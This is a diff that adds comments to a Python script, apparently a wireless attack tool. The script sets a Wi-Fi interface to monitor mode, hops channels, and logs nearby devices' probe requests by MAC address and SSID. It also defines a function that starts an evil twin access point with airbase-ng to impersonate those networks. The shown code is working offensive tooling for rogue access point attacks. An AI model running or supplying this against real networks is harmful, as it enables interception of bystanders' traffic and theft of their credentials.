@@ -10,6 +10,7 @@ interface = "wlan0"
 stop_hopper = False
 probes = {}
 
+# Set the interface mode (monitor or managed)
 def set_interface_mode(interface, mode):
     os.system(f"sudo ip link set {interface} down")
     result = os.system(f"sudo iw {interface} set type {mode}")
@@ -17,14 +18,15 @@ def set_interface_mode(interface, mode):
         print(f"Failed to set {interface} to {mode} mode.")
     os.system(f"sudo ip link set {interface} up")
 
-
+# Set the interface to monitor mode
 def set_monitor_mode(interface):
     set_interface_mode(interface, "monitor")
 
+# Set the interface to managed mode
 def set_managed_mode(interface):
     set_interface_mode(interface, "managed")
 
-
+# Continuously hop through Wi-Fi channels
 def channel_hopper():
     global stop_hopper
     while not stop_hopper:
@@ -34,6 +36,7 @@ def channel_hopper():
             os.system(f"iw dev {interface} set channel {channel}")
             time.sleep(1)
 
+# Process packets, looking for probe requests
 def callback(packet):
     if packet.haslayer(Dot11ProbeReq):
         ssid = packet[Dot11Elt].info.decode()
@@ -42,6 +45,7 @@ def callback(packet):
             print(f"Detected device {client_mac} probing for {ssid}")
             probes[client_mac] = ssid
 
+# Create an evil twin access point
 def create_evil_twin(ssid, interface):
     print(f"Creating evil twin for {ssid}...")
     process = subprocess.Popen(["sudo", "airbase-ng", "-e", ssid, "-c", "6", interface])
